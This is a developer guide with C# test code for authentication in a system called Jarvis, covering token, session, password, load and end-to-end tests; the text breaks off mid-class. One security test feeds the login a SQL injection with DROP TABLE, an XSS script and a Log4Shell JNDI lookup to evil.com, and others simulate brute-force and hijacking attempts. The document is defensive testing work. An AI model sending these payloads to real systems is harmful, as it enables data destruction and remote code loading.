# Authentication Testing Guide

This guide covers comprehensive testing strategies for authentication systems in Jarvis, including unit tests, integration tests, security tests, and performance tests.

## Table of Contents

1. [Testing Philosophy](#testing-philosophy)
2. [Test Setup](#test-setup)
3. [Unit Testing](#unit-testing)
4. [Integration Testing](#integration-testing)
5. [Security Testing](#security-testing)
6. [Performance Testing](#performance-testing)
7. [End-to-End Testing](#end-to-end-testing)
8. [Test Data Management](#test-data-management)

## Testing Philosophy

### Testing Pyramid for Authentication

```
              ┌─────────────────┐
              │   E2E Tests     │ <- Full user flows
              │  (UI/API Tests) │
              └─────────────────┘
            ┌─────────────────────┐
            │  Integration Tests  │ <- Handler/System integration
            │  (Database Tests)   │
            └─────────────────────┘
          ┌─────────────────────────┐
          │      Unit Tests         │ <- Component/Handler logic
          │   (Fast, Isolated)      │
          └─────────────────────────┘
```

### Key Testing Principles

1. **Test Authentication Flows**: Focus on complete authentication workflows
2. **Test Security Scenarios**: Include attack scenarios and edge cases
3. **Test Error Conditions**: Ensure proper error handling and security
4. **Clean Test Data**: Always clean up authentication data after tests
5. **Realistic Test Data**: Use realistic email formats and password patterns

## Test Setup

### Base Test Classes

```csharp
public abstract class AuthenticationTestBase : IntegrationTestBase
{
    protected IPasswordService PasswordService { get; private set; }
    protected ITokenService TokenService { get; private set; }
    protected ISecurityAuditService SecurityAuditService { get; private set; }

    protected override void SetUp()
    {
        base.SetUp();
        
        PasswordService = TestDataContext().GetService<IPasswordService>();
        TokenService = TestDataContext().GetService<ITokenService>();
        SecurityAuditService = TestDataContext().GetService<ISecurityAuditService>();
    }

    /// <summary>
    /// Creates a test user account with specified properties
    /// </summary>
    protected async Task<(Guid EntityId, Account Account)> CreateTestUser(
        string email = null, 
        string password = "TestPassword123!",
        bool isActive = true)
    {
        email ??= $"test-{Guid.NewGuid()}@example.com";
        var entityId = Guid.NewGuid();
        TrackEntity(entityId); // For cleanup

        var accountHandler = TestDataContext().For<AccountHandler>(entityId);
        
        var account = await accountHandler.Register(new Account
        {
            Email = email,
            Password = password
        });

        if (isActive)
        {
            account = await accountHandler.Activate();
        }

        return (entityId, account);
    }

    /// <summary>
    /// Creates an authenticated user and returns tokens
    /// </summary>
    protected async Task<(Guid EntityId, Account Account, AuthToken Token)> CreateAuthenticatedUser(
        string email = null,
        string password = "TestPassword123!")
    {
        var (entityId, account) = await CreateTestUser(email, password, true);
        
        var authHandler = TestDataContext().For<AuthHandler>(Guid.NewGuid());
        var authToken = await authHandler.Authenticate(new Account
        {
            Email = account.Email,
            Password = password,
            IpAddress = "127.0.0.1",
            UserAgent = "TestAgent/1.0"
        });

        return (entityId, account, authToken);
    }

    /// <summary>
    /// Simulates time passing for token expiration tests
    /// </summary>
    protected void SimulateTimePass(TimeSpan duration)
    {
        // In real implementation, you might use a time provider service
        // For testing, we can modify component timestamps directly
    }
}
```

### Test Configuration

```json
{
  "ConnectionStrings": {
    "DefaultConnection": "Host=localhost;Database=jarvis_test;Username=test;Password=test"
  },
  "Jwt": {
    "AccessTokenExpirationMinutes": 1,  // Short for testing
    "RefreshTokenExpirationDays": 1,
    "SecretKey": "test-secret-key-for-testing-must-be-256-bits-long",
    "Issuer": "JarvisTest",
    "Audience": "JarvisTestUsers"
  },
  "Security": {
    "BCryptWorkFactor": 4,  // Lower for faster tests
    "MaxFailedAttempts": 3,
    "LockoutDurationMinutes": 1,
    "MaxActiveSessions": 2
  },
  "Logging": {
    "LogLevel": {
      "Default": "Warning",
      "core.jarvis": "Information"
    }
  }
}
```

## Unit Testing

### Testing Account Handler

```csharp
public class AccountHandlerTests : AuthenticationTestBase
{
    [Fact]
    public async Task Register_ValidAccount_ShouldCreateInactiveAccount()
    {
        // Arrange
        var entityId = Guid.NewGuid();
        TrackEntity(entityId);
        var accountHandler = TestDataContext().For<AccountHandler>(entityId);

        var accountToRegister = new Account
        {
            Email = "test@example.com",
            Password = "SecurePassword123!"
        };

        // Act
        var registeredAccount = await accountHandler.Register(accountToRegister);

        // Assert
        registeredAccount.ShouldNotBeNull();
        registeredAccount.Email.ShouldBe("test@example.com");
        registeredAccount.IsActive.ShouldBeFalse(); // Starts inactive
        registeredAccount.Password.ShouldBeEmpty(); // Plain password cleared
        registeredAccount.PasswordHash.ShouldNotBeEmpty();
        registeredAccount.OwnerEntityId.ShouldBe(entityId);
        
        // Verify password was hashed
        PasswordService.VerifyPassword("SecurePassword123!", registeredAccount.PasswordHash)
            .ShouldBeTrue();
    }

    [Fact]
    public async Task Register_DuplicateEmail_ShouldThrowBusinessRuleException()
    {
        // Arrange
        var email = "duplicate@example.com";
        var (firstEntityId, _) = await CreateTestUser(email);
        
        var secondEntityId = Guid.NewGuid();
        TrackEntity(secondEntityId);
        var secondAccountHandler = TestDataContext().For<AccountHandler>(secondEntityId);

        // Act & Assert
        var exception = await Should.ThrowAsync<BusinessRuleException>(async () =>
        {
            await secondAccountHandler.Register(new Account
            {
                Email = email,
                Password = "AnotherPassword123!"
            });
        });

        exception.Code.ShouldBe("EMAIL_EXISTS");
    }

    [Theory]
    [InlineData("", "Password is required")]
    [InlineData("invalid-email", "Invalid email format")]
    [InlineData("test@example.com", "Password is required")]
    public async Task Register_InvalidInput_ShouldThrowValidationException(
        string email, string password)
    {
        // Arrange
        var entityId = Guid.NewGuid();
        TrackEntity(entityId);
        var accountHandler = TestDataContext().For<AccountHandler>(entityId);

        // Act & Assert
        await Should.ThrowAsync<ValidationException>(async () =>
        {
            await accountHandler.Register(new Account
            {
                Email = email,
                Password = string.IsNullOrEmpty(password) ? "" : "ValidPassword123!"
            });
        });
    }

    [Fact]
    public async Task Activate_InactiveAccount_ShouldActivateAccount()
    {
        // Arrange
        var (entityId, account) = await CreateTestUser(isActive: false);
        var accountHandler = TestDataContext().For<AccountHandler>(entityId);

        // Act
        var activatedAccount = await accountHandler.Activate();

        // Assert
        activatedAccount.IsActive.ShouldBeTrue();
        activatedAccount.LastUpdated.ShouldBeGreaterThan(account.LastUpdated);
    }

    [Fact]
    public async Task Activate_AlreadyActiveAccount_ShouldReturnActiveAccount()
    {
        // Arrange
        var (entityId, account) = await CreateTestUser(isActive: true);
        var accountHandler = TestDataContext().For<AccountHandler>(entityId);

        // Act
        var result = await accountHandler.Activate();

        // Assert
        result.IsActive.ShouldBeTrue();
        result.Id.ShouldBe(account.Id);
    }

    [Fact]
    public async Task Deactivate_ActiveAccount_ShouldDeactivateAccount()
    {
        // Arrange
        var (entityId, account) = await CreateTestUser(isActive: true);
        var accountHandler = TestDataContext().For<AccountHandler>(entityId);

        // Act
        var deactivatedAccount = await accountHandler.Deactivate();

        // Assert
        deactivatedAccount.IsActive.ShouldBeFalse();
        deactivatedAccount.LastUpdated.ShouldBeGreaterThan(account.LastUpdated);
    }
}
```

### Testing Auth Handler

```csharp
public class AuthHandlerTests : AuthenticationTestBase
{
    [Fact]
    public async Task Authenticate_ValidCredentials_ShouldReturnAuthToken()
    {
        // Arrange
        var email = "test@example.com";
        var password = "TestPassword123!";
        var (entityId, account) = await CreateTestUser(email, password, true);
        
        var authHandler = TestDataContext().For<AuthHandler>(Guid.NewGuid());

        // Act
        var authToken = await authHandler.Authenticate(new Account
        {
            Email = email,
            Password = password,
            IpAddress = "192.168.1.1",
            UserAgent = "TestAgent/1.0",
            ClientId = "test-client"
        });

        // Assert
        authToken.ShouldNotBeNull();
        authToken.AccessToken.ShouldNotBeEmpty();
        authToken.RefreshToken.ShouldNotBeEmpty();
        authToken.OwnerEntityId.ShouldBe(entityId);
        authToken.ExpiresAt.ShouldBeGreaterThan(DateTime.UtcNow);
        authToken.RefreshExpiresAt.ShouldBeGreaterThan(DateTime.UtcNow);
        authToken.SessionId.ShouldNotBe(Guid.Empty);
    }

    [Fact]
    public async Task Authenticate_WrongPassword_ShouldReturnEmptyToken()
    {
        // Arrange
        var email = "test@example.com";
        var (entityId, account) = await CreateTestUser(email, "CorrectPassword123!", true);
        
        var authHandler = TestDataContext().For<AuthHandler>(Guid.NewGuid());

        // Act
        var authToken = await authHandler.Authenticate(new Account
        {
            Email = email,
            Password = "WrongPassword123!",
            IpAddress = "192.168.1.1",
            UserAgent = "TestAgent/1.0"
        });

        // Assert
        authToken.AccessToken.ShouldBeEmpty();
        authToken.RefreshToken.ShouldBeEmpty();
        authToken.OwnerEntityId.ShouldBe(Guid.Empty);
    }

    [Fact]
    public async Task Authenticate_InactiveAccount_ShouldReturnEmptyToken()
    {
        // Arrange
        var email = "inactive@example.com";
        var password = "TestPassword123!";
        var (entityId, account) = await CreateTestUser(email, password, false); // Inactive
        
        var authHandler = TestDataContext().For<AuthHandler>(Guid.NewGuid());

        // Act
        var authToken = await authHandler.Authenticate(new Account
        {
            Email = email,
            Password = password,
            IpAddress = "192.168.1.1",
            UserAgent = "TestAgent/1.0"
        });

        // Assert
        authToken.AccessToken.ShouldBeEmpty();
    }

    [Fact]
    public async Task Authenticate_NonexistentAccount_ShouldReturnEmptyToken()
    {
        // Arrange
        var authHandler = TestDataContext().For<AuthHandler>(Guid.NewGuid());

        // Act
        var authToken = await authHandler.Authenticate(new Account
        {
            Email = "nonexistent@example.com",
            Password = "SomePassword123!",
            IpAddress = "192.168.1.1",
            UserAgent = "TestAgent/1.0"
        });

        // Assert
        authToken.AccessToken.ShouldBeEmpty();
    }

    [Fact]
    public async Task RefreshToken_ValidRefreshToken_ShouldReturnNewTokens()
    {
        // Arrange
        var (entityId, account, authToken) = await CreateAuthenticatedUser();
        var authHandler = TestDataContext().For<AuthHandler>(Guid.NewGuid());

        // Act
        var newTokens = await authHandler.RefreshToken(authToken.RefreshToken);

        // Assert
        newTokens.AccessToken.ShouldNotBeEmpty();
        newTokens.RefreshToken.ShouldNotBeEmpty();
        newTokens.AccessToken.ShouldNotBe(authToken.AccessToken);
        newTokens.RefreshToken.ShouldNotBe(authToken.RefreshToken);
        newTokens.OwnerEntityId.ShouldBe(entityId);
        newTokens.SessionId.ShouldBe(authToken.SessionId); // Same session
    }

    [Fact]
    public async Task RefreshToken_InvalidRefreshToken_ShouldReturnEmptyToken()
    {
        // Arrange
        var authHandler = TestDataContext().For<AuthHandler>(Guid.NewGuid());

        // Act
        var newTokens = await authHandler.RefreshToken("invalid-refresh-token");

        // Assert
        newTokens.AccessToken.ShouldBeEmpty();
        newTokens.RefreshToken.ShouldBeEmpty();
    }

    [Fact]
    public async Task RefreshToken_ExpiredRefreshToken_ShouldReturnEmptyToken()
    {
        // Arrange
        var (entityId, account, authToken) = await CreateAuthenticatedUser();
        
        // Manually expire the refresh token in database
        var tokenHandler = TestDataContext().For<AuthTokenHandler>(entityId);
        var expiredToken = authToken with 
        { 
            RefreshExpiresAt = DateTime.UtcNow.AddDays(-1),
            LastUpdated = DateTime.UtcNow
        };
        await TestDataContext().Commit(expiredToken);

        var authHandler = TestDataContext().For<AuthHandler>(Guid.NewGuid());

        // Act
        var newTokens = await authHandler.RefreshToken(authToken.RefreshToken);

        // Assert
        newTokens.AccessToken.ShouldBeEmpty();
    }

    [Theory]
    [InlineData("' OR '1'='1")]
    [InlineData("'; DROP TABLE accounts; --")]
    [InlineData("<script>alert('xss')</script>")]
    [InlineData("${jndi:ldap://evil.com/a}")]
    public async Task Authenticate_MaliciousInput_ShouldReturnEmptyToken(string maliciousInput)
    {
        // Arrange
        var authHandler = TestDataContext().For<AuthHandler>(Guid.NewGuid());

        // Act
        var authToken = await authHandler.Authenticate(new Account
        {
            Email = maliciousInput,
            Password = maliciousInput,
            IpAddress = "192.168.1.1",
            UserAgent = "TestAgent/1.0"
        });

        // Assert
        authToken.AccessToken.ShouldBeEmpty();
    }
}
```

## Integration Testing

### Full Authentication Flow Tests

```csharp
public class AuthenticationFlowTests : AuthenticationTestBase
{
    [Fact]
    public async Task FullAuthenticationFlow_ShouldWork()
    {
        // Arrange
        var email = "flowtest@example.com";
        var password = "FlowTestPassword123!";

        // Act 1: Register
        var entityId = Guid.NewGuid();
        TrackEntity(entityId);
        var accountHandler = TestDataContext().For<AccountHandler>(entityId);
        var registeredAccount = await accountHandler.Register(new Account
        {
            Email = email,
            Password = password
        });

        // Assert 1: Account created but inactive
        registeredAccount.IsActive.ShouldBeFalse();

        // Act 2: Activate
        var activatedAccount = await accountHandler.Activate();

        // Assert 2: Account is now active
        activatedAccount.IsActive.ShouldBeTrue();

        // Act 3: Authenticate
        var authHandler = TestDataContext().For<AuthHandler>(Guid.NewGuid());
        var authToken = await authHandler.Authenticate(new Account
        {
            Email = email,
            Password = password,
            IpAddress = "192.168.1.100",
            UserAgent = "IntegrationTest/1.0"
        });

        // Assert 3: Authentication successful
        authToken.AccessToken.ShouldNotBeEmpty();
        authToken.RefreshToken.ShouldNotBeEmpty();
        authToken.OwnerEntityId.ShouldBe(entityId);

        // Act 4: Validate access token
        var tokenService = TestDataContext().GetService<ITokenService>();
        var principal = await tokenService.ValidateAccessToken(authToken.AccessToken);

        // Assert 4: Token is valid
        principal.ShouldNotBeNull();
        principal.FindFirst("sub")?.Value.ShouldBe(entityId.ToString());
        principal.FindFirst("email")?.Value.ShouldBe(email);

        // Act 5: Refresh token
        var newTokens = await authHandler.RefreshToken(authToken.RefreshToken);

        // Assert 5: New tokens generated
        newTokens.AccessToken.ShouldNotBeEmpty();
        newTokens.AccessToken.ShouldNotBe(authToken.AccessToken);
        newTokens.RefreshToken.ShouldNotBe(authToken.RefreshToken);

        // Act 6: Try to use old refresh token (should fail)
        var shouldFailTokens = await authHandler.RefreshToken(authToken.RefreshToken);

        // Assert 6: Old refresh token is invalid
        shouldFailTokens.AccessToken.ShouldBeEmpty();
    }

    [Fact]
    public async Task SessionManagement_ShouldEnforceSessionLimits()
    {
        // Arrange
        var (entityId, account) = await CreateTestUser(isActive: true);
        var authHandler = TestDataContext().For<AuthHandler>(Guid.NewGuid());
        var maxSessions = 2; // From test config

        var sessions = new List<AuthToken>();

        // Act: Create multiple sessions
        for (int i = 0; i < maxSessions + 1; i++)
        {
            var authToken = await authHandler.Authenticate(new Account
            {
                Email = account.Email,
                Password = "TestPassword123!",
                IpAddress = $"192.168.1.{100 + i}",
                UserAgent = $"TestClient{i}/1.0",
                ClientId = $"client-{i}"
            });

            sessions.Add(authToken);
        }

        // Assert: All sessions created
        sessions.All(s => !string.IsNullOrEmpty(s.AccessToken)).ShouldBeTrue();

        // Act: Check active sessions in database
        var activeSessions = await TestDataContext().Query()
            .With<AuthToken>(t => t.OwnerEntityId == entityId)
            .With<AuthToken>(t => !t.IsRevoked)
            .ToEntityComponents();

        // Assert: Session limit enforced (oldest session should be revoked)
        activeSessions.Count.ShouldBeLessThanOrEqualTo(maxSessions);
    }

    [Fact]
    public async Task PasswordReset_FullFlow_ShouldWork()
    {
        // This would test a complete password reset flow
        // when PasswordResetHandler is implemented
    }
}
```

### Database Integration Tests

```csharp
public class AuthenticationDatabaseTests : AuthenticationTestBase
{
    [Fact]
    public async Task AccountComponent_ShouldPersistCorrectly()
    {
        // Arrange
        var entityId = Guid.NewGuid();
        TrackEntity(entityId);
        var accountHandler = TestDataContext().For<AccountHandler>(entityId);

        var originalAccount = new Account
        {
            Email = "dbtest@example.com",
            Password = "DbTestPassword123!"
        };

        // Act
        var savedAccount = await accountHandler.Register(originalAccount);
        
        // Read from database directly
        var retrievedAccount = await accountHandler.GetOrDefault();

        // Assert
        retrievedAccount.ShouldNotBeNull();
        retrievedAccount.Email.ShouldBe(originalAccount.Email);
        retrievedAccount.PasswordHash.ShouldNotBeEmpty();
        retrievedAccount.Password.ShouldBeEmpty(); // Should not be persisted
        retrievedAccount.IsActive.ShouldBeFalse();
        retrievedAccount.CreatedAt.ShouldBeCloseTo(DateTime.UtcNow, TimeSpan.FromSeconds(5));
    }

    [Fact]
    public async Task AuthTokenComponent_ShouldPersistWithVersioning()
    {
        // Arrange
        var (entityId, account, authToken) = await CreateAuthenticatedUser();
        
        // Create a handler for the auth token entity
        var tokenEntityId = Guid.NewGuid();
        TrackEntity(tokenEntityId);
        var tokenHandler = TestDataContext().For<AuthTokenHandler>(tokenEntityId);

        var tokenToSave = authToken with 
        { 
            OwnerEntityId = tokenEntityId,
            AccessToken = "", // Don't store access token
            RefreshToken = "" // Don't store plain refresh token
        };

        // Act
        await TestDataContext().Commit(tokenToSave);
        var retrievedToken = await tokenHandler.GetOrDefault();

        // Assert
        retrievedToken.ShouldNotBeNull();
        retrievedToken.OwnerEntityId.ShouldBe(tokenEntityId);
        retrievedToken.RefreshTokenHash.ShouldNotBeEmpty();
        retrievedToken.AccessToken.ShouldBeEmpty();
        retrievedToken.RefreshToken.ShouldBeEmpty();
        retrievedToken.Version.ShouldNotBeNull(); // Versioned component
        retrievedToken.SessionId.ShouldBe(authToken.SessionId);
    }

    [Fact]
    public async Task ConcurrentAuthentication_ShouldHandleVersioning()
    {
        // Arrange
        var (entityId, account) = await CreateTestUser(isActive: true);
        
        // Act: Simulate concurrent authentication attempts
        var authTasks = Enumerable.Range(0, 5).Select(async i =>
        {
            var authHandler = TestDataContext().For<AuthHandler>(Guid.NewGuid());
            return await authHandler.Authenticate(new Account
            {
                Email = account.Email,
                Password = "TestPassword123!",
                IpAddress = $"192.168.1.{100 + i}",
                UserAgent = $"ConcurrentClient{i}/1.0"
            });
        });

        var results = await Task.WhenAll(authTasks);

        // Assert: All authentications should succeed
        results.All(r => !string.IsNullOrEmpty(r.AccessToken)).ShouldBeTrue();
        results.Select(r => r.SessionId).Distinct().Count().ShouldBe(5); // Unique sessions
    }
}
```

## Security Testing

### Security Attack Simulation Tests

```csharp
public class SecurityAttackTests : AuthenticationTestBase
{
    [Fact]
    public async Task BruteForceAttack_ShouldBeLimited()
    {
        // Arrange
        var (entityId, account) = await CreateTestUser(isActive: true);
        var authHandler = TestDataContext().For<AuthHandler>(Guid.NewGuid());
        var bruteForceService = TestDataContext().GetService<IBruteForceProtectionService>();
        
        var wrongPassword = "WrongPassword123!";
        var ipAddress = "192.168.1.100";

        // Act: Simulate brute force attack
        var attempts = new List<AuthToken>();
        for (int i = 0; i < 10; i++)
        {
            var result = await authHandler.Authenticate(new Account
            {
                Email = account.Email,
                Password = wrongPassword,
                IpAddress = ipAddress,
                UserAgent = "AttackerClient/1.0"
            });
            attempts.Add(result);
        }

        // Assert: After max attempts, IP should be blocked
        var isBlocked = await bruteForceService.IsBlocked(ipAddress);
        isBlocked.ShouldBeTrue();

        // All attempts should fail
        attempts.All(a => string.IsNullOrEmpty(a.AccessToken)).ShouldBeTrue();
    }

    [Fact]
    public async Task TimingAttack_ShouldHaveConsistentTiming()
    {
        // Arrange
        var (entityId, account) = await CreateTestUser(isActive: true);
        var authHandler = TestDataContext().For<AuthHandler>(Guid.NewGuid());

        var validCredentials = new Account
        {
            Email = account.Email,
            Password = "TestPassword123!",
            IpAddress = "192.168.1.1",
            UserAgent = "TimingTest/1.0"
        };

        var invalidCredentials = new Account
        {
            Email = "nonexistent@example.com",
            Password = "WrongPassword123!",
            IpAddress = "192.168.1.1",
            UserAgent = "TimingTest/1.0"
        };

        // Act: Measure timing for both scenarios
        var validTimes = new List<long>();
        var invalidTimes = new List<long>();

        for (int i = 0; i < 5; i++)
        {
            var stopwatch = Stopwatch.StartNew();
            await authHandler.Authenticate(validCredentials);
            stopwatch.Stop();
            validTimes.Add(stopwatch.ElapsedMilliseconds);

            stopwatch.Restart();
            await authHandler.Authenticate(invalidCredentials);
            stopwatch.Stop();
            invalidTimes.Add(stopwatch.ElapsedMilliseconds);
        }

        // Assert: Timing should be similar (within reasonable variance)
        var validAvg = validTimes.Average();
        var invalidAvg = invalidTimes.Average();
        var timingDifference = Math.Abs(validAvg - invalidAvg);
        
        // Should be less than 100ms difference on average
        timingDifference.ShouldBeLessThan(100);
    }

    [Fact]
    public async Task TokenReplayAttack_ShouldBeBlocked()
    {
        // Arrange
        var (entityId, account, authToken) = await CreateAuthenticatedUser();
        var tokenService = TestDataContext().GetService<ITokenService>();

        // Act: Try to use the same token multiple times
        var firstValidation = await tokenService.ValidateAccessToken(authToken.AccessToken);
        var secondValidation = await tokenService.ValidateAccessToken(authToken.AccessToken);

        // Assert: Depending on implementation, second use might be blocked
        // This test documents the expected behavior
        firstValidation.ShouldNotBeNull();
        // secondValidation might be null if JTI tracking is implemented
    }

    [Fact]
    public async Task SessionHijacking_ShouldBeDetected()
    {
        // Arrange
        var (entityId, account, authToken) = await CreateAuthenticatedUser();
        var sessionSecurity = TestDataContext().GetService<ISessionSecurityService>();

        var originalContext = CreateHttpContext("192.168.1.100", "OriginalClient/1.0");
        var hijackerContext = CreateHttpContext("10.0.0.50", "HackerClient/1.0");

        // Act: Validate session from different IP/User-Agent
        var originalValid = await sessionSecurity.ValidateSession(authToken, originalContext);
        var hijackerValid = await sessionSecurity.ValidateSession(authToken, hijackerContext);

        // Assert: Different IP should be rejected
        originalValid.ShouldBeTrue();
        hijackerValid.ShouldBeFalse();
    }

    private HttpContext CreateHttpContext(string ipAddress, string userAgent)
    {
        var context = new DefaultHttpContext();
        context.Connection.RemoteIpAddress = IPAddress.Parse(ipAddress);
        context.Request.Headers["User-Agent"] = userAgent;
        return context;
    }
}
```

### Password Security Tests

```csharp
public class PasswordSecurityTests : AuthenticationTestBase
{
    private readonly IPasswordPolicyService _passwordPolicy;

    public PasswordSecurityTests()
    {
        _passwordPolicy = TestDataContext().GetService<IPasswordPolicyService>();
    }

    [Theory]
    [InlineData("password", false)] // Common password
    [InlineData("Password1", false)] // Too simple
    [InlineData("SecurePassword123!", true)] // Good password
    [InlineData("MyVeryLongAndSecurePasswordWithSpecialChars123!@#", true)] // Very secure
    public async Task PasswordPolicy_ShouldValidateCorrectly(string password, bool shouldBeValid)
    {
        // Act
        var result = await _passwordPolicy.ValidatePassword(password);

        // Assert
        result.IsValid.ShouldBe(shouldBeValid);
        if (!shouldBeValid)
        {
            result.Errors.ShouldNotBeEmpty();
        }
    }

    [Fact]
    public async Task PasswordHashing_ShouldBeSecure()
    {
        // Arrange
        var password = "TestPassword123!";
        var passwordService = TestDataContext().GetService<IPasswordService>();

        // Act
        var hash1 = passwordService.HashPassword(password);
        var hash2 = passwordService.HashPassword(password);

        // Assert
        hash1.ShouldNotBe(hash2); // Different salts
        hash1.ShouldStartWith("$2a$"); // BCrypt format
        passwordService.VerifyPassword(password, hash1).ShouldBeTrue();
        passwordService.VerifyPassword("WrongPassword", hash1).ShouldBeFalse();
    }

    [Fact]
    public async Task PasswordHashing_PerformanceTest()
    {
        // Arrange
        var password = "PerformanceTest123!";
        var passwordService = TestDataContext().GetService<IPasswordService>();

        // Act
        var stopwatch = Stopwatch.StartNew();
        var hash = passwordService.HashPassword(password);
        stopwatch.Stop();

        // Assert: Should take reasonable time (BCrypt is intentionally slow)
        stopwatch.ElapsedMilliseconds.ShouldBeGreaterThan(10); // At least 10ms
        stopwatch.ElapsedMilliseconds.ShouldBeLessThan(5000); // Less than 5 seconds

        var verifyStopwatch = Stopwatch.StartNew();
        var isValid = passwordService.VerifyPassword(password, hash);
        verifyStopwatch.Stop();

        isValid.ShouldBeTrue();
        verifyStopwatch.ElapsedMilliseconds.ShouldBeLessThan(5000);
    }
}
```

## Performance Testing

### Load Testing

```csharp
public class AuthenticationPerformanceTests : AuthenticationTestBase
{
    [Fact]
    public async Task Authentication_ConcurrentLoad_ShouldPerform()
    {
        // Arrange
        var userCount = 50;
        var users = new List<(Guid EntityId, Account Account)>();
        
        // Create test users
        for (int i = 0; i < userCount; i++)
        {
            var user = await CreateTestUser($"loadtest{i}@example.com", "LoadTest123!", true);
            users.Add(user);
        }

        // Act: Concurrent authentication
        var stopwatch = Stopwatch.StartNew();
        var authTasks = users.Select(async user =>
        {
            var authHandler = TestDataContext().For<AuthHandler>(Guid.NewGuid());
            return await authHandler.Authenticate(new Account
            {
                Email = user.Account.Email,
                Password = "LoadTest123!",
                IpAddress = "192.168.1.1",
                UserAgent = "LoadTest/1.0"
            });
        });

        var results = await Task.WhenAll(authTasks);
        stopwatch.Stop();

        // Assert
        results.All(r => !string.IsNullOrEmpty(r.AccessToken)).ShouldBeTrue();
        stopwatch.ElapsedMilliseconds.ShouldBeLessThan(30000); // Under 30 seconds
        
        var avgTimePerAuth = (double)stopwatch.ElapsedMilliseconds / userCount;
        avgTimePerAuth.ShouldBeLessThan(1000); // Under 1 second per auth on average
    }

    [Fact]
    public async Task TokenGeneration_Performance_ShouldBeReasonable()
    {
        // Arrange
        var tokenService = TestDataContext().GetService<ITokenService>();
        var iterations = 1000;

        // Act
        var stopwatch = Stopwatch.StartNew();
        for (int i = 0; i < iterations; i++)
        {
            var accessToken = tokenService.AccessToken(Guid.NewGuid(), "test@example.com");
            var refreshToken = tokenService.RefreshToken();
        }
        stopwatch.Stop();

        // Assert
        var avgTimePerToken = (double)stopwatch.ElapsedMilliseconds / iterations;
        avgTimePerToken.ShouldBeLessThan(10); // Under 10ms per token pair
    }
}
```

### Memory and Resource Tests

```csharp
public class AuthenticationResourceTests : AuthenticationTestBase
{
    [Fact]
    public async Task Authentication_MemoryUsage_ShouldBeReasonable()
    {
        // Arrange
        var (entityId, account) = await CreateTestUser(isActive: true);
        var authHandler = TestDataContext().For<AuthHandler>(Guid.NewGuid());

        var initialMemory = GC.GetTotalMemory(true);

        // Act: Perform many authentications
        for (int i = 0; i < 100; i++)
        {
            var authToken = await authHandler.Authenticate(new Account
            {
                Email = account.Email,
                Password = "TestPassword123!",
                IpAddress = "192.168.1.1",
                UserAgent = "MemoryTest/1.0"
            });
        }

        var finalMemory = GC.GetTotalMemory(true);

        // Assert: Memory usage should not grow excessively
        var memoryGrowth = finalMemory - initialMemory;
        memoryGrowth.ShouldBeLessThan(10 * 1024 * 1024); // Less than 10MB growth
    }
}
```

## End-to-End Testing

### API Endpoint Tests

```csharp
public class AuthenticationApiTests : IClassFixture<WebApplicationFactory<Program>>
{
    private readonly HttpClient _client;
    private readonly WebApplicationFactory<Program> _factory;

    public AuthenticationApiTests(WebApplicationFactory<Program> factory)
    {
        _factory = factory;
        _client = factory.CreateClient();
    }

    [Fact]
    public async Task RegisterEndpoint_ValidInput_ShouldReturnCreated()
    {
        // Arrange
        var registerRequest = new
        {
            email = "apitest@example.com",
            password = "ApiTestPassword123!"
        };

        // Act
        var response = await _client.PostAsJsonAsync("/api/auth/register", registerRequest);

        // Assert
        response.StatusCode.ShouldBe(HttpStatusCode.Created);
        
        var account = await response.Content.ReadFromJsonAsync<Account>();
        account.ShouldNotBeNull();
        account.Email.ShouldBe("apitest@example.com");
        account.IsActive.ShouldBeFalse();
    }

    [Fact]
    public async Task AuthEndpoint_ValidCredentials_ShouldReturnToken()
    {
        // Arrange: Register and activate user
        var email = "authtest@example.com";
        var password = "AuthTestPassword123!";
        
        // Register
        await _client.PostAsJsonAsync("/api/auth/register", new { email, password });
        
        // Activate (would typically be done by admin)
        // For testing, we might need a test endpoint or direct database access
        
        var authRequest = new { email, password };

        // Act
        var response = await _client.PostAsJsonAsync("/api/security/auth", authRequest);

        // Assert
        if (response.StatusCode == HttpStatusCode.Unauthorized)
        {
            // Account might not be activated - this documents the behavior
            return;
        }
        
        response.StatusCode.ShouldBe(HttpStatusCode.OK);
        
        var authToken = await response.Content.ReadFromJsonAsync<AuthToken>();
        authToken.ShouldNotBeNull();
        authToken.AccessToken.ShouldNotBeEmpty();
        authToken.RefreshToken.ShouldNotBeEmpty();
    }

    [Fact]
    public async Task AuthEndpoint_InvalidCredentials_ShouldReturnUnauthorized()
    {
        // Arrange
        var authRequest = new
        {
            email = "nonexistent@example.com",
            password = "WrongPassword123!"
        };

        // Act
        var response = await _client.PostAsJsonAsync("/api/security/auth", authRequest);

        // Assert
        response.StatusCode.ShouldBe(HttpStatusCode.Unauthorized);
    }

    [Fact]
    public async Task RefreshEndpoint_ValidToken_ShouldReturnNewTokens()
    {
        // This would require setting up an authenticated user first
        // and then testing the refresh endpoint
    }
}
```

## Test Data Management

### Test User Factory

```csharp
public class TestUserFactory
{
    private readonly IDataContext _dataContext;
    private readonly List<Guid> _createdEntities = new();

    public TestUserFactory(IDataContext dataContext)
    {
        _dataContext = dataContext;
    }

    public async Task<TestUser> CreateBasicUser(string email = null)
    {
        email ??= $"test-{Guid.NewGuid()}@example.com";
        var entityId = Guid.NewGuid();
        _createdEntities.Add(entityId);

        var accountHandler = _dataContext.For<AccountHandler>(entityId);
        var account = await accountHandler.Register(new Account
        {
            Email = email,
            Password = "TestPassword123!"
        });

        return new TestUser(entityId, account, _dataContext);
    }

    public async Task<TestUser> CreateActiveUser(string email = null)
    {
        var user = await CreateBasicUser(email);
        await user.Activate();
        return user;
    }

    public async Task<TestUser> CreateAuthenticatedUser(string email = null)
    {
        var user = await CreateActiveUser(email);
        await user.Authenticate();
        return user;
    }

    public async Task Cleanup()
    {
        foreach (var entityId in _createdEntities)
        {
            try
            {
                // Clean up accounts
                var accountHandler = _dataContext.For<AccountHandler>(entityId);
                await accountHandler.Remove();

                // Clean up related auth tokens
                var authTokens = await _dataContext.Query()
                    .With<AuthToken>(t => t.OwnerEntityId == entityId)
                    .ToEntityIds();

                foreach (var tokenId in authTokens)
                {
                    var tokenHandler = _dataContext.For<AuthTokenHandler>(tokenId);
                    await tokenHandler.Remove();
                }
            }
            catch
            {
                // Ignore cleanup errors
            }
        }
        
        _createdEntities.Clear();
    }
}

public class TestUser
{
    private readonly Guid _entityId;
    private readonly IDataContext _dataContext;
    
    public Account Account { get; private set; }
    public AuthToken? AuthToken { get; private set; }

    public TestUser(Guid entityId, Account account, IDataContext dataContext)
    {
        _entityId = entityId;
        Account = account;
        _dataContext = dataContext;
    }

    public async Task<TestUser> Activate()
    {
        var accountHandler = _dataContext.For<AccountHandler>(_entityId);
        Account = await accountHandler.Activate();
        return this;
    }

